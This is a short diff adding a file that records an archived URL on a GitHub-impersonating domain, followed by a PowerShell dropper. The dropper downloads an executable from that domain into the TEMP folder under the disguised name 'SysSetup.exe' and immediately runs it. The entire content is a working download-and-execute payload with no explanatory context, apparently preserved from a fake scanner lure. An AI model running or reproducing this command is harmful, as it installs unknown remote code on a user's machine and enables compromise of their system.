@@ -1,0 +1,10 @@
+
+http://web.archive.org/web/20240919000400/https://github-scanner.com/download.txt
+
+
+
+$webClient = New-Object System.Net.WebClient
+$url1 = "https://github-scanner.com/l6E.exe"
+$filePath1 = "$env:TEMP\SysSetup.exe"
+$webClient.DownloadFile($url1, $filePath1)
+Start-Process -FilePath  $env:TEMP\SysSetup.exe
